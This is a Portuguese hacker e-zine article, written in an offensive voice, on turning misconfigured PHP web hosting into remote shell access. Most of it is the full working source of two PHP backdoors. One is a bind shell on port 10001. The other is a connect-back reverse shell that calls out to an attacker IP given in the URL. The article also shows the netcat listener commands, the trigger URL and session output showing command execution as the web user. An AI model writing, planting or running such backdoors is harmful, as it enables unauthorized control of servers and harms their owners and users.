@@ -1,0 +1,332 @@
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+=-[02]-=[Malícia é o mais importante]-=|tDs|=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+________________
+| [1] INTRODUCAO |
+`================
+Poderia bem colocar outro titulo neste texto, mas... Bom, isto nao vem ao
+caso. O que importa e' neste momento e', como citou Einsten:
+
+"A imaginação e' mais importante que o conhecimento."
+
+
+___________
+| [2] O QUE |
+`===========
+A utilizacao de PHP vem aumentando a uma velocidade muito grande. Com
+isso, o numero de utilizadores tambem aumenta, mas em muitos casos apenas
+os recursos basicos desta linguagem sao utilizados.
+Mas o que pode PHP fazer? Com PHP voce pode, entre outras coisas:
+
+- Fazer operacoes matematicas;
+- Criar aplicativos que rodem via linha de comando;
+- Criar aplicativos que utilizem GUI (Graphic User Interface);
+- Criar imagens;
+- Criar documentos PDF;
+- Trabalhar com memoria compartilhada/IPC;
+- Manipular processos;
+- ...
+- Utilizar sockets;
+
+OTIMO! Posso utilizar sockets.
+
+
+__________________________
+| [3] INTRODUCAO, PARTE II |
+`==========================
+Se as configuracoes do PHP estivem bem feitas, a utilizacao dele de forma
+maliciosa pode se tornar um pouco mais complicado. Mas deixando de lado o
+pessimismo, vamos supor que a configuracao nao seja das melhores (nao esteja
+bem configurado). Vamos brincar um pouco com ele entao.
+
+Algumas funcoes nativas do php para execucao de programas sao:
+
+exec - Executa um programa externo
+passthru - Executa um programa externo e mostra a saida crúa
+proc_open - Executa um comando e abre ponteiros de arquivos para
+entrada/saída
+shell_exec - Executa um comando via shell e retorna a saída inteira
+system - Executa um programa externo e mostra a saída
+backtick operator, que e' um comando entre o sinal de acento grave
+(`uname -a`).
+
+Consegue enxergar algo ai? Continuando, temos tambem as funcoes para
+manipulacao de sockets. Vejamos algumas:
+
+socket_create - Create a socket (endpoint for communication)
+socket_bind - Binds a name to a socket
+socket_listen - Listens for a connection on a socket
+socket_accept - Accepts a connection on a socket
+socket_write - Write to a socket
+
+A visao esta clareando? Se podemos executar comandos e podemos criar
+sockets, por que nao podemos unir o util ao agradavel; criar um socket que
+escute na porta X, aguarde conexoes do endereco Y e execute os comandos por
+ele enviados?
+A resposta e': MAS NOS PODEMOS...
+
+
+_________________________
+| [4] INICIO DA DOMINACAO |
+`=========================
+Temos o seguinte cenario (isso nao aconteceu):
+Contratei uma empresa de hosting para hospedar meu site, sem segundas
+intencoes. Apos algumas verificacoes, notei que nem tudo estava bem configurado
+por ali. Escrevi entao um script que criava um socket, e ficava escutando na
+porta 10001. O script e' o seguinte:
+
+-----backdoor.php-------------------------------------------------------------
+<?php
+define ('_STECK_ADD_', $_SERVER['SERVER_ADDR']);
+define ('_STECK_PORTA_', '10001');
+define ('_STECK_MSG_SHELL_', 'steck@motdlabs:');
+error_reporting (0);
+set_time_limit (0);
+ob_implicit_flush ();
+function STC_bDoor ()
+{
+function STCerro($stclinha){echo 'erro em'.$stclinha;}
+function STCShellMsg()
+{
+$stcmsg = _STECK_MSG_SHELL_;
+$stcmsg .= shell_exec ('pwd');
+$stcmsg = str_replace ("\n", '', $stcmsg);
+$stcmsg = str_replace ("\r", '', $stcmsg);
+$stcmsg .= '$';
+return ($stcmsg);
+}
+if (($stcsock = socket_create (AF_INET, SOCK_STREAM, SOL_TCP)) < 0) {
+STCerro (__LINE__);
+}
+if (($stcret = socket_bind ($stcsock, _STECK_ADD_, _STECK_PORTA_)) < 0) {
+STCerro (__LINE__);
+}
+if (($stcret = socket_listen ($stcsock, 5)) < 0) {
+STCerro (__LINE__);
+}
+$stcflag = 0;
+do {
+if (($stcSockFD = socket_accept ($stcsock)) < 0) {
+STCerro (__LINE__);
+break;
+}
+do {
+if (false === ($stcbuf = socket_read
+($stcSockFD, 8192, PHP_NORMAL_READ))) {
+STCerro (__LINE__);
+break 2;
+}
+if (!$stcbuf = trim ($stcbuf)) { continue; }
+if ($stcbuf == 'exit') {
+unset ($stcflag);
+break;
+}
+if ($stcbuf == 'T') {
+socket_close ($stcSockFD);
+break 2;
+}
+if (substr_count ($stcbuf, "cd") && strpos ($stcbuf, " ") == 2) {
+$stcexe = chdir (str_replace ("cd ", "", $stcbuf));
+} else {
+if (substr_count ($stcbuf, "ls") &&
+(( strpos ($stcbuf, " ") == 2) ||
+strlen ($stcbuf) == 2)) {
+}
+$stcbuf .= " 2>&1";
+$stcexe = shell_exec ($stcbuf);
+$stcexe = str_replace ("\n", "\n\r", $stcexe);
+socket_write ($stcSockFD, $stcexe, strlen ($stcexe));
+}
+$stcmsgRet = STCShellMsg ();
+socket_write ($stcSockFD, $stcmsgRet, strlen ($stcmsgRet));
+} while (true);
+socket_close ($stcSockFD);
+} while (true);
+socket_close ($stcsock);
+}
+STC_bDoor ();
+?>
+----------------------------------------------------------------------------
+
+Depois de criar o script, coloquei ele no meu site, e o acessei (o endereco
+dele era http://www.site.com/backdoor.php). O script ficou rodando, sem nenhuma
+mensagem. Ai entao tentei, via telnet, acessar o endereco site.com na porta
+10001. O que aconteceu?
+
+tds@matrix:/$ telnet site.com 10001
+Trying 241.242.243.244 ...
+Connected to site.com.
+Escape character is '^]'.
+uname -a
+Linux site.com 2.4.22 #6 Tue Sep 2 17:43:01 PDT 2003 i686 unknown unknown
+GNU/Linux
+steck@motdlabs:/usr/local/apache2/htdocs/site.com/$
+
+Legal, uma shell. Estou nela atraves de uma backdoor escrita em php. Muito
+bom! E apenas o comeco.
+
+
+_________________________________
+| [5] NOVAS IDEIAS/MAIS BACKDOORS |
+`=================================
+Tudo vai bem quando se esta bem. Apos alguns testes e depois de mais um
+tempo de desenvolvimento, a backdoor foi aprimorada (o fonte dela esta
+disponivel para download, veja nos links, ao final do texto). Apos alguns dias
+utilizando-a, notei que nao estava funcionando em diversos servidores, nao por
+falha no codigo ou por boa configuracao dos servidores, mas pura e simplesmente
+gracas a alguns firewalls atrapalhando. Pronto. Havia acabado a diversao.
+
+
+_____________________________________________
+| [6] PHP MAL CONFIGURADO + FIREWALL != SHELL |
+`=============================================
+Apos executar a backdoor, notava-se que ela realmente estava funcionando
+(tinha uma outra forma de acesso ao servidor, mas queria mesmo uma shell), e
+estava escutando na porta 10001. Mas por que entao nao tinha acesso via telnet
+a ela? UM FIREWALL, OBVIO. Deveria ter um firewall que rejeitasse qualquer
+pedido de conexao a portas diferentes de 80. Seria o fim? Ainda nao.
+
+
+______________________________________________________
+| [7] PHP MAL CONFIGURADO + FIREWALL + MALICIA = SHELL |
+`======================================================
+Se nao se pode conectar em nenhuma porta que nao seja a 80, nao podemos
+"solicitar" que o servidor conecte-se a uma maquina que determinar-mos? Seria
+mais ou menos assim:
+
+Estamos aqui Entraremos aqui
+++++++++ ++++++++++
++ + + +
+
++ HOST A + + SERVIDOR +
++ + + +
+++++++++ ++++++++++
+
+a) HOST A agurda por uma conexao na porta 44321;
+b) SERVIDOR executa script em php que conecta-se a HOST A na porta 44321;
+c) Assim que recebe a conexao de SERVIDOR, HOST A esta pronto para executar
+"o que quiser";
+
+Na pratica, pode ser feito da seguinte forma:
+
+a) HOST A executa netcat, para aguardar conexoes na porta 44321 no endereco ip
+245.246.247.248, que e' o seu endereco:
+
+tds@matrix:/$ nc -l -p 44321 -s 245.246.247.248
+
+b) SERVIDOR executa o seguinte script:
+
+-----backdoor2.php------------------------------------------------------------
+<?php
+error_reporting (0);
+set_time_limit (0);
+ignore_user_abort (1);
+ob_implicit_flush ();
+define ('_REVSTECK_MSG_SHELL_', 'revsteck@motdlabs:');
+function RSTRevSteck () {
+function RSTShellMsg ()
+{
+$rstmsg = _REVSTECK_MSG_SHELL_;
+$rstmsg .= shell_exec ('pwd');
+$rstmsg = str_replace ("\n", '', $rstmsg);
+$rstmsg = str_replace ("\r", '', $rstmsg);
+$rstmsg .= '$';
+return ($rstmsg);
+}
+$rsthost = $_REQUEST['rstip'];
+$rstporta = $_REQUEST['rstpo'];
+$rstflag = 1;
+if (!$rsthost) { $rsthost = $_SERVER['REMOTE_ADDR']; }
+if (!$rstporta) { die ('Porta nao informada.'); }
+$rstcon = fsockopen ($rsthost, $rstporta, $rsterrno, $rsterrstr, 1);
+if (!$rstcon) {
+echo 'Erro na linha '.__LINE__.': '.$rsterrstr.' ';
+echo $rsterrno."<br />\n\r";
+die;
+}
+while ($rstflag) {
+$rstbuf = fgets ($rstcon, 1024);
+if (!$rstbuf = trim ($rstbuf)) { continue; }
+if ($rstbuf == 'exit') {
+unset ($rstflag);
+break;
+}
+if (substr_count ($rstbuf, "cd") && strpos ($rstbuf, " ") == 2) {
+$rstexe = chdir (str_replace ("cd ", "", $rstbuf));
+} else {
+if (substr_count ($rstbuf, "ls") && ((
+strpos ($rstbuf, " ") == 2) ||
+strlen ($rstbuf) == 2)) {
+}
+$rstbuf .= " 2>&1";
+$rstexe = shell_exec ($rstbuf);
+$rstexe = str_replace ("\n", "\n\r", $rstexe);
+fwrite ($rstcon, $rstexe, strlen ($rstexe));
+}
+$rstmsgRet = RSTShellMsg();
+fwrite ($rstcon, $rstmsgRet, strlen ($rstmsgRet));
+}
+fclose ($rstcon);
+}
+RSTRevSteck ();
+?>
+----------------------------------------------------------------------------
+
+O acesso a ele ficaria entao assim:
+http://www.servidor.com/backdoor2.php?rstpo=44321&rstip=245.246.247.248
+
+c) De volta ao terminal, onde foi executado o netcat temos:
+
+tds@matrix:/$ nc -l -p 44321 -s 245.246.247.248
+CONECTADO!
+id
+uid=1006(apache) gid=103(apache) groups=103(apache)
+revsteck@motdlabs:/usr/local/apache2/htdocs/servidor.com$uname -a
+Linux servidor.com 2.4.22 #6 Tue Mar 5 12:51:07 PDT 2003 i586 unknown
+unknown GNU/Linux
+revsteck@motdlabs:/usr/local/apache2/htdocs/servidor.com/$
+
+Parece brincadeira, mas e' serio. A quantidade de servidores internet afora
+vulneraveis nao e' pequena. Uma versao melhorada do script exposto acima esta
+disponivel para download, veja nos links, ao final do texto.
+
+
+_____________________________
+| [8] TERMINANDO DA DOMINACAO |
+`=============================
+Uma vez dentro, a chance de elevacao de privilegios e' bastante grande.
+Mesmo utilizando apenas php para isso. Pode parecer utopico, mas nao e'. Mas
+isso fica para um proximo texto... Em breve.
+
+
+___________
+| [9] LINKS |
+`===========
+http://tds.motdlabs.org/myhome/index.php?nav=1&snav=5 - Backdoor em php
+http://tds.motdlabs.org/myhome/index.php?nav=1&snav=6 - Backdoor em php,
+utilizando conceitos de connect-back
+
+http://www.motdlabs.org
+http://cdm.frontthescene.com.br
+http://www.frontthescene.com.br
+/j #motd -> irc.freenode.net
+
+
+___________________________
+| [10] CONSIDERACOES FINAIS |
+`===========================
+Seria mais facil se eu conseguisse organizar meus pensamentos em palavras
+de maneira mais intuitiva, mas tudo bem... Espero que ao menos tenha sido
+compreensivel o que escrito. Caso nao tenha, estou a disposicao para trocar
+ideias sobre o assunto.
+
+Longe de esgotar os assuntos (php e malicia), apenas uma breve introducao
+nos mesmos. Nota-se o poder que pode ter um script em php apenas com os
+mostrados acima. Mas muito alem disso, uma arma com grande poder e' a malicia.
+Se teu programa nao pode entrar, peca para algum que possa carrega-lo para
+voce. Se 3 + 3 nao esta dando certo, tente 2 + 4, 1 + 5, outras formas de
+chegar ao objetivo... Mas o mais importante e' enxergar alem do alcance dos
+olhos, onde acredita-se nao ter nada... Enxergar alem do final.
+
+"Tudo da certo no fim, se não deu é porque ainda não chegou no fim"
